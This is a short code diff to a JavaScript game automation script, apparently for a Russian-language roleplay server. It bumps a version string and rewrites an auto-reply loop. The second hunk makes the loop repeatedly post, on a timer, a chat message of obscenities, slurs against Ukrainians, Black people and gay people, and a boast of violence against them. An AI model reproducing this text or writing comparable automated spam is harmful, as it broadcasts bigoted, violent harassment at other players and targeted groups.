@@ -202,7 +202,7 @@ function _showAccessDenied(nick) {
 // ── ВСЁ ЧТО НИЖЕ ВЫПОЛНЯЕТСЯ ТОЛЬКО ЕСЛИ НИК ПРОШЁЛ ПРОВЕРКУ ──
 
 // MVD AHK VERSION: 2.3 (NAPARNICK)
-console.log("[INIT] === MVD AHK v0.9 ЗАГРУЖЕН ===");
+console.log("[INIT] === MVD AHK v0.999 ЗАГРУЖЕН ===");
 // Надёжное получение своего ID через список игроков window.updatePlayerList() дёргает движковое событие "UpdatePlayersList", ответ на котор...
 let cachedMyId = 0;
 const _origOnUpdatePlayersList = window.onUpdatePlayersList;
@@ -797,7 +797,7 @@ const setupChatHandler = () => {
                                 for (let _i = 0; _i < _khmCount; _i++) {
                                     (function(_delay, _num) {
                                         setTimeout(() => {
-                                            sendChatInput('/d [ALL]');
+                                            sendChatInput('/d [ALL]  ЕБАЛ В РОТ UKR НЕГРЫ ПИД0РЫ РЕЗАЛ ИХ РДМИР ХУЙНЯ КАЗ');
                                             console.log(`[AUTO-ОТВЕТ] 📨 /d отправлен (${_num}/${_khmCount}) через ${_delay}мс`);
                                         }, _delay);
                                     })(_khmAccDelay, _i + 1);
